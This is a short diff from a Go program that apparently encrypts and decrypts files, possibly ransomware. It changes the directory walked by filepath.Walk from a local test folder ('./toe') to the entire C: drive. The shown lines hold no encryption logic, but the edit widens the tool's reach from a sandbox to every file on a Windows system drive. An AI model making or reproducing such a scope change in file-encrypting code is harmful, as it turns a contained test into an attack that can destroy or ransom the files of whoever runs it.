@@ -108,8 +108,8 @@ func main() {
 		fmt.Println("decrypting")
 	}
 
-	// root := "C:\\"
-	root := "./toe"
+	root := "C:\\"
+	// root := "./toe"
 
 	err := filepath.Walk(root, visit(&files))
 	
